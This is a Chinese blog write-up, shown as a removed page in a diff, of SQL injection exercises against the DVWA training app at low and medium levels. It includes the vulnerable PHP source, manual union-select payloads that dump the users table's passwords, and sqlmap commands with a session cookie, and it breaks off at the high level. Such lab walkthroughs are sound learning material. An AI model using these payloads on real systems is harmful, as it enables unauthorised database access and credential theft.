@@ -1,4 +1,506 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.leeyuxun.github.io",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"./public/search.xml"}</script><meta name="description" content="前言记录学习DVWA中的SQL注入过程，包括手工注入、SQLmap注入两部分。"><meta property="og:type" content="article"><meta property="og:title" content="DVWA SQL Injection"><meta property="og:url" content="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html"><meta property="og:site_name" content="Leeyuxun の blog"><meta property="og:description" content="前言记录学习DVWA中的SQL注入过程，包括手工注入、SQLmap注入两部分。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171123.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171335.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171423.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172008.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172046.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172123.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172625.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172816.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115174208.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115202820.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115203412.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204341.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204558.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204755.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204946.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115205247.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115211926.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212532.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212630.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212909.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213015.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213055.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213329.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213543.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115214838.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215648.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215916.png"><meta property="og:image" content="https://www.leeyuxun.github.io/Users/leeyuxun/Library/Application%20Support/typora-user-images/image-20201115223004551.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223436.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223610.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223751.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223931.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115224153.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116113840.png"><meta property="article:published_time" content="2019-11-15T08:30:19.000Z"><meta property="article:modified_time" content="2020-11-16T14:16:33.547Z"><meta property="article:author" content="李钰璕"><meta property="article:tag" content="SQL Injection"><meta property="article:tag" content="SQLmap"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171123.png"><link rel="canonical" href="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>DVWA SQL Injection | Leeyuxun の blog</title><script>function sendPageView(){if(CONFIG.hostname===location.hostname){var e=localStorage.getItem("uid")||Math.random()+"."+Math.random();localStorage.setItem("uid",e),navigator.sendBeacon("https://www.google-analytics.com/collect",new URLSearchParams({v:1,tid:"UA-163555158-1",cid:e,t:"pageview",dp:encodeURIComponent(location.pathname)}))}}document.addEventListener("pjax:complete",sendPageView),sendPageView()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">Leeyuxun の blog</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">BUPT | SCSS</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.png"><meta itemprop="name" content="李钰璕"><meta itemprop="description" content="从0开始学习网络安全"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Leeyuxun の blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DVWA SQL Injection</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-11-15 16:30:19" itemprop="dateCreated datePublished" datetime="2019-11-15T16:30:19+08:00">2019-11-15</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-11-16 22:16:33" itemprop="dateModified" datetime="2020-11-16T22:16:33+08:00">2020-11-16</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/DVWA/" itemprop="url" rel="index"><span itemprop="name">DVWA</span></a> </span></span><span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录学习DVWA中的SQL注入过程，包括手工注入、SQLmap注入两部分。<a id="more"></a></p><p>目的：爆破数据库，通过SQL注入，找到dvwa网站所有的用户名及密码。</p><h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># low.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_REQUEST[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        $query = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query ) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>]))? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]):(($___mysqli_res = mysqli_connect_error())? $___mysqli_res : <span class="keyword">false</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>($row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">            $last = $row[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：服务器端的low.php并没有对客户输入的id进行任何检查与过滤，直接将SQL语句的执行结果显示给客户端。</p><h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h3><p>判断是否存在注入以及注入类型——字符型/数字型</p><ol><li><p>输入<code>1</code>，查询成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171123.png" alt=""></p></li><li><p>输入<code>1&#39; and &#39;1&#39;=&#39;2</code>查询失败，无回显；</p></li><li><p>输入<code>1&#39; and &#39;1&#39;=&#39;1</code>查询成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171335.png" alt=""></p></li><li><p>输入<code>1&#39;</code>报错；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171423.png" alt=""></p></li></ol><p>根据上述发现猜测存在<strong>字符型注入</strong>。</p><h3 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h3><p>使用<code>order by</code>猜测SQL查询语句中的字段数，为union查询做准备</p><ol><li><p>输入<code>1&#39; or 1=1 order by 1 #</code>，查询成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172008.png" alt=""></p></li><li><p>输入<code>1&#39; or 1=1 order by 2 #</code>，查询成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172046.png" alt=""></p></li><li><p>输入<code>1&#39; or 1=1 order by 3 #</code>，查询失败；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172123.png" alt=""></p></li></ol><p>说明查询语句中存在2个字段，即First name和Surname；</p><h3 id="确定显示字段顺序"><a href="#确定显示字段顺序" class="headerlink" title="确定显示字段顺序"></a>确定显示字段顺序</h3><p>输入<code>1&#39; union select 1,2 #</code>，查询成功，两个字段显示如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172625.png" alt=""></p><h3 id="获取当前数据库和用户名"><a href="#获取当前数据库和用户名" class="headerlink" title="获取当前数据库和用户名"></a>获取当前数据库和用户名</h3><p>输入<code>1&#39; union select database(),user() #</code>，查看数据库为dvwa，用户为dvwa；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172816.png" alt=""></p><h3 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><p>输入<code>1&#39; union select TABLE_NAME,2 from information_schema.TABLES where TABLE_SCHEMA=&#39;dvwa&#39; #</code>，获取表名为guestbook和users</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115174208.png" alt=""></p><h3 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h3><p>输入<code>1&#39; union select COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME=&#39;users&#39; #</code>，获取字段如下user_id、first_name、last_name、user、password、avatar、last_login、failed_login、USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115202820.png" alt=""></p><h3 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h3><p>输入<code>1&#39; union select user,password from users #</code>，获取users表中的所有用户和密码；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115203412.png" alt=""></p><p>查看表guestbook同理。</p><h2 id="SQLmap注入"><a href="#SQLmap注入" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><h3 id="注入判断-1"><a href="#注入判断-1" class="headerlink" title="注入判断"></a>注入判断</h3><p>注意：dvwa需要登录才能访问漏洞测试页面，所以使用sqlmap时需要提交登录后的cookie，cookie中有关于dvwa的security level设置属性；</p><p>输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot;</code>，发现存在SQL注入点id(GET),数据库类型为mysql；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204341.png" alt=""></p><h3 id="爆破数据库"><a href="#爆破数据库" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p>输入 <code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; --dbs</code>，爆破数据库如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204558.png" alt=""></p><h3 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p>选择dvwa数据库，输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; -D dvwa --tables</code>，爆破数据表如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204755.png" alt=""></p><h3 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h3><p>选择users表，输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; -D dvwa -T users --columns</code>，爆破字段如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204946.png" alt=""></p><h3 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h3><p>输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; -D dvwa -T users -C user,password --dump</code>，爆破user、password字段内容如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115205247.png" alt=""></p><h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># medium.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">        $id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],$id);</span><br><span class="line">        $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>( $row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="comment">// Display values</span></span><br><span class="line">            $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">            $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID:&#123;$id&#125;&lt;br/&gt;First name:&#123;$first&#125;&lt;br/&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// This is used later on in the index.php page</span></span><br><span class="line">    <span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">    $query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>]))?mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]):(($___mysqli_res=mysqli_connect_error())?$___mysqli_res:<span class="keyword">false</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    $number_of_rows = mysqli_fetch_row($result)[<span class="number">0</span>];</span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：改用POST方式提交，对id进行了mysqli_real_escape_string()函数过滤，但SQL语句存在数字型注入；</p><p>mysqli_real_escape_string()函数语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">connection</td><td style="text-align:left">必需，规定要使用的 MySQL 连接。</td></tr><tr><td style="text-align:left">escapestring</td><td style="text-align:left">必需，要转义的字符串。编码的字符是NULL(ASCII 0)、\n、\r、\、’、” 和 Control-Z。</td></tr></tbody></table></div><h2 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断-2"><a href="#注入判断-2" class="headerlink" title="注入判断"></a>注入判断</h3><p>POST方式传递，采用抓包更改参数；</p><ol><li><p>抓包更改id为<code>1&#39; and &#39;1&#39;=&#39;1</code>，报错，显示字符被转义，不是字符型注入；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115211926.png" alt=""></p></li><li><p>抓包更改id为<code>1 and 1=2</code>，无回显；</p></li><li><p>抓包更改id为<code>1 and 1=1</code>，有回显如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212532.png" alt=""></p></li><li><p>抓包更改id为<code>1 or 1=1</code>，有回显如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212630.png" alt=""></p></li></ol><p>根据上述发现猜测存在<strong>数字型注入</strong>。</p><h3 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h3><p>使用<code>order by</code>猜测SQL查询语句中的字段数，为union查询做准备</p><ol><li><p>更改id为<code>1 or 1=1 order by 1 #</code>，查询成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212909.png" alt=""></p></li><li><p>更改id为<code>1 or 1=1 order by 2 #</code>，查询成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213015.png" alt=""></p></li><li><p>更改id为<code>1 or 1=1 order by 3 #</code>，查询失败；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213055.png" alt=""></p></li></ol><p>说明查询语句中存在2个字段，即First name和Surname；</p><h3 id="确定显示字段顺序-1"><a href="#确定显示字段顺序-1" class="headerlink" title="确定显示字段顺序"></a>确定显示字段顺序</h3><p>更改id为<code>1 union select 1,2 #</code>，查询成功，两个字段显示如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213329.png" alt=""></p><h3 id="获取当前数据库和用户名-1"><a href="#获取当前数据库和用户名-1" class="headerlink" title="获取当前数据库和用户名"></a>获取当前数据库和用户名</h3><p>更改id为<code>1 union select database(),user() #</code>，查询成功，数据库为dvwa，用户为dvwa；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213543.png" alt=""></p><h3 id="获取数据库中的表-1"><a href="#获取数据库中的表-1" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><p>更改id为<code>1 union select TABLE_NAME,2 form information_schema.TABLES where TABLE_SCHEMA=database() #</code>，查询成功，获取表如下；(此处的数据库名称也可为十六进制)</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115214838.png" alt=""></p><h3 id="获取表中的字段名-1"><a href="#获取表中的字段名-1" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h3><p>更改id为<code>1 union select COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME=0x7573657273 #</code>，获取字段如下user_id、first_name、last_name、user、password、avatar、last_login、failed_login、USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215648.png" alt=""></p><h3 id="下载数据-1"><a href="#下载数据-1" class="headerlink" title="下载数据"></a>下载数据</h3><p>更改id为<code>1 union select user,password from users #</code>，获取users表中的所有用户和密码；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215916.png" alt=""></p><h2 id="SQLmap注入-1"><a href="#SQLmap注入-1" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><p>SQLmap进行POST注入过程如下：</p><h3 id="截获数据包"><a href="#截获数据包" class="headerlink" title="截获数据包"></a>截获数据包</h3><p>将截获的数据包复制到文件data.txt中</p><p><img src="/Users/leeyuxun/Library/Application Support/typora-user-images/image-20201115223004551.png" alt="image-20201115223004551"></p><h3 id="注入判断-3"><a href="#注入判断-3" class="headerlink" title="注入判断"></a>注入判断</h3><p>输入<code>sqlmap -r data.txt -p id</code>，发现存在SQL注入点id(POST),数据库类型为mysql；-r表示读取文件，-p表示注入参数；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223436.png" alt=""></p><h3 id="爆破数据库-1"><a href="#爆破数据库-1" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p>输入<code>sqlmap -r data.txt -p id -dbs</code>，获取数据库；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223610.png" alt=""></p><h3 id="爆破数据表-1"><a href="#爆破数据表-1" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p>选择dvwa数据库，输入<code>sqlmap -r data.txt -p id -D dvwa --tables</code>，获取dvwa数据库的数据表；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223751.png" alt=""></p><h3 id="爆破字段-1"><a href="#爆破字段-1" class="headerlink" title="爆破字段"></a>爆破字段</h3><p>选择users数据表，输入<code>sqlmap -r data.txt -p id -D dvwa -T users --columns</code>，获取users表的字段；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223931.png" alt=""></p><h3 id="爆破字段内容-1"><a href="#爆破字段内容-1" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h3><p>输入<code>sqlmap -r data.txt -p id -D dvwa -T users -C user,password --dump</code>，爆破user和password字段内容；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115224153.png" alt=""></p><h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 